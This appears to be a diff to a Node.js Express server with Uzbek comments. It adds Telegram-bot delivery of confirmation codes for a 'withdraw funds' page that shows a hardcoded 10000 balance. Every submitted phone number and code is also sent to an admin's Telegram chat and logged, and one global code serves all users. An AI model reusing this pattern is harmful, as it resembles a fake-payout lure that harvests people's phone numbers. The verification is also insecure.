@@ -1,8 +1,18 @@
+require('dotenv').config();
 const express = require('express');
 const path = require('path');
-const app = express();
+const TelegramBot = require('node-telegram-bot-api');
 
+const app = express();
 const PORT = process.env.PORT || 3000;
+
+// Telegram Botni sozlash
+const BOT_TOKEN = process.env.BOT_TOKEN;
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
+
+// Telegram Chat ID va Telefon raqamlarini moslashtirib saqlash xotirasi (Database o'rniga)
+const userSessions = {};
+let activeCode = "12345";
 
 app.use(express.json());
 
@@ -11,24 +21,85 @@ app.get('/api/get-balance', (req, res) => {
     res.json({ success: true, balance: 10000 });
 });
 
-app.post('/api/send-code', (req, res) => {
-    const { phone } = req.body;
+// Saytda raqam kiritilganda ushbu raqam egasining Telegramiga kod yuborish
+app.post('/api/send-code', async (req, res) => {
+    let { phone } = req.body;
     if (!phone) {
         return res.json({ success: false, message: "Telefon raqam kiritilmadi!" });
     }
-    // Telegramga kod yuborish logikasi shu yerda bo'ladi
-    res.json({ success: true, message: "Kod yuborildi!" });
-});
 
-app.post('/api/submit-withdraw', (req, res) => {
-    const { inputCode, password } = req.body;
-    if (inputCode !== "12345") { // Misol uchun tekshirish
-        return res.json({ success: false, message: "Kod noto'g'ri!" });
+    // Telefon formati to'g'rilanadi (faqat raqamlar qoldiriladi)
+    phone = phone.replace(/\D/g, ''); 
+    if (phone.startsWith('998')) phone = phone.substring(3);
+
+    const targetChatId = userSessions[phone];
+
+    // 5 xonali tasodifiy kod yaratish
+    activeCode = Math.floor(10000 + Math.random() * 90000).toString();
+
+    try {
+        // 1-Variant: Agar ushbu raqam egasi botdan ro'yxatdan o'tgan bo'lsa, to'g'ridan-to'g'ri o'ziga yuborish
+        if (targetChatId) {
+            await bot.sendMessage(
+                targetChatId,
+                `🔑 *Sizning tasdiqlash kodingiz:* \`${activeCode}\`\n\nKodni hech kimga bermang!`,
+                { parse_mode: 'Markdown' }
+            );
+        }
+
+        // 2-Variant: Agar ADMIN_ID sozlagan bo mezon bo'yicha barcha so'rovlar adminga ham borsa
+        if (process.env.ADMIN_ID) {
+            await bot.sendMessage(
+                process.env.ADMIN_ID,
+                `📥 *Yangi so'rov!*
+📱 *Telefon:* +998${phone}
+🔑 *Kod:* \`${activeCode}\``,
+                { parse_mode: 'Markdown' }
+            );
+        }
+
+        console.log(`[LOG] Raqam: +998${phone} \vert{} Kod:${activeCode}`);
+        res.json({ success: true, message: "Kod yuborildi!" });
+    } catch (error) {
+        console.error("Telegramga yuborishda xatolik:", error);
+        res.json({ success: false, message: "Serverda xatolik yuz berdi!" });
     }
-    res.json({ success: true, message: "Mablag' muvaffaqiyatli yechildi!", newBalance: 0 });
 });
 
-// 2. Frontend HTML sahifasi (To'g'ridan-to'g'ri Express orqali chiqariladi)
+// Tasdiqlash va yechib olish so'rovi
+app.post('/api/submit-withdraw', (req, res) => {
+    const { inputCode } = req.body;
+
+    if (inputCode !== activeCode) {
+        return res.json({ success: false, message: "Kod noto'g'ri! Iltimos, qaytadan tekshiring." });
+    }
+
+    res.json({ success: true, message: "Mablag' muvaffaqiyatli yechib olindi!", newBalance: 0 });
+});
+
+// Telegram Bot xabarlarini eshitish (Start va Kontakt ulash)
+bot.on('message', (msg) => {
+    const chatId = msg.chat.id;
+
+    if (msg.contact && msg.contact.phone_number) {
+        let phone = msg.contact.phone_number.replace(/\D/g, '');
+        if (phone.startsWith('998')) phone = phone.substring(3);
+
+        userSessions[phone] = chatId; // Telefon raqam va Chat ID bir-biriga bog'landi
+        bot.sendMessage(chatId, "✅ Raqamingiz muvaffaqiyatli ulandi! Endi saytdan so'ralgan kodlar shu yerga keladi.");
+    } else if (msg.text === '/start') {
+        bot.sendMessage(chatId, `Assalomu alaykum! Sayt so'rovlari va kodlarini Telegramdan olish uchun pastdagi tugma orqali raqamingizni yuboring:\n\nSizning Chat ID: \`${chatId}\``, {
+            parse_mode: 'Markdown',
+            reply_markup: {
+                keyboard: [[{ text: "📱 Raqamni ulash", request_contact: true }]],
+                resize_keyboard: true,
+                one_time_keyboard: true
+            }
+        });
+    }
+});
+
+// 2. Frontend HTML sahifasi
 app.get('/', (req, res) => {
     res.send(`
 <!DOCTYPE html>
@@ -319,8 +390,11 @@ app.get('/', (req, res) => {
             });
             const data = await res.json();
             if (data.success) {
+                document.getElementById('statusAlert').innerText = data.message;
                 document.getElementById('statusAlert').style.display = 'block';
                 document.getElementById('codeGroup').style.display = 'block';
+            } else {
+                alert(data.message);
             }
         } catch (e) { alert("Xatolik yuz berdi!"); }
     }
